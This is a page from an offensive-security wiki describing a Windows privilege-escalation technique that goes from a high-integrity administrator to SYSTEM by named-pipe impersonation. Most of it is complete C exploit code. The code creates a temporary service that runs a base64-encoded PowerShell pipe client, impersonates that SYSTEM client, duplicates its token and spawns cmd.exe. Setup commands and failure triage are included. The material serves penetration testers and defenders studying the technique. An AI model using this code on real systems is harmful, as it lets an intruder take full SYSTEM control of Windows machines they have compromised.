# From High Integrity to SYSTEM with Name Pipes

{{#include ../../banners/hacktricks-training.md}}

This is the **administrator/SCM variant** of named-pipe impersonation: an elevated process creates a temporary service whose child connects as `SYSTEM`, then impersonates that client. If the starting context cannot create services but has `SeImpersonatePrivilege`, use a privileged-service coercion instead; see [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) and [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Creating the service requires access to the SCM and `SERVICE_START` access to the new service, while `CreateProcessWithTokenW` requires `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Quickly confirm the expected starting context:

```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```

**Code flow:**

1. Create the named-pipe server **before** starting the service. When waiting, treat `ConnectNamedPipe` returning `FALSE` with `ERROR_PIPE_CONNECTED` as success: it means the client won the race and connected between `CreateNamedPipe` and `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Create and start a service that will connect to the created pipe and write something. The service code will execute this encoded PS code: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. After the service connects and writes, call `ImpersonateNamedPipeClient`, open the resulting thread token, and duplicate it as a primary token.<sup>[[1]](#references)</sup>
4. Use that primary token to spawn `cmd.exe`.<sup>[[2]](#references)</sup>

This route assumes the caller can create/start a service and possesses the privileges required by `CreateProcessWithTokenW` (normally `SeImpersonatePrivilege`). It is a high-integrity-to-SYSTEM technique, not a primitive available to an arbitrary low-privileged user.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> If service creation/start fails, the sample does not signal the pipe thread and can wait indefinitely. Add error handling and an overlapped pipe timeout before using it outside a lab. Also use a random pipe/service name to avoid collisions.

`ImpersonateNamedPipeClient` adopts the context associated with the **last message read**, so a connection alone is insufficient: make the privileged client write, verify that `ReadFile` returned data, and only then impersonate. Duplicate the thread impersonation token into a `TokenPrimary` token with `SecurityImpersonation`; a primary token is what the process-creation API consumes.<sup>[[1]](#references)[[5]](#references)</sup>

```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

	SC_HANDLE scManager;
	SC_HANDLE scService;

	scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

	if (scManager == NULL) {
		return FALSE;
	}

	// create Piper service
	scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
		"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
		NULL, NULL, NULL, NULL, NULL);

	if (scService == NULL) {
		//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
		return FALSE;
	}

	// launch it
	StartService(scService, 0, NULL);

	// wait a bit and then cleanup
	Sleep(10000);
	DeleteService(scService);

	CloseServiceHandle(scService);
	CloseServiceHandle(scManager);
}

int main() {

	LPCSTR sPipeName = "\\\\.\\pipe\\piper";
	HANDLE hSrvPipe;
	HANDLE th;
	BOOL bPipeConn;
	char pPipeBuf[MESSAGE_SIZE];
	DWORD dBRead = 0;

	HANDLE hImpToken;
	HANDLE hNewToken;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	// open pipe
	hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

	// create and run service
	th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

	// wait for the connection from the service
	bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
	if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
		bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
	}
	if (bPipeConn) {
		if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
			return -6;
		}

		// impersonate the service (SYSTEM)
		if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
			return -1;
		}

		// wait for the service to cleanup
		WaitForSingleObject(th, INFINITE);

		// get a handle to impersonated token
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
			return -2;
		}

		// create new primary token for new process
		if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
			TokenPrimary, &hNewToken)) {
			return -4;
		}

		//Sleep(20000);
		// spawn cmd.exe as full SYSTEM user
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
			CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
			return -5;
		}

		// revert back to original security context
		RevertToSelf();

	}

	return 0;
}
```

### Failure triage

- `ConnectNamedPipe == FALSE` with `ERROR_PIPE_CONNECTED`: continue; the pipe is already connected.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` fails with `ERROR_CANNOT_IMPERSONATE` (`1368`): confirm the SYSTEM client actually wrote data and `ReadFile` completed. Also inspect the client's requested impersonation level; identification/anonymous-level clients cannot be fully impersonated.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` fails with `ERROR_PRIVILEGE_NOT_HELD` (`1314`): the original caller does not hold `SeImpersonatePrivilege`. From a high-integrity administrator context, use the token-copy route documented in [SeImpersonate from High To System](seimpersonate-from-high-to-system.md), or use `CreateProcessAsUserW` while impersonating SYSTEM if its required privileges are present.<sup>[[2]](#references)</sup>
- `CreateServiceA` returns `ERROR_SERVICE_EXISTS` (`1073`): delete the stale `PiperSrv` entry or randomize `PIPESRV`; always delete the temporary service after the trigger.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
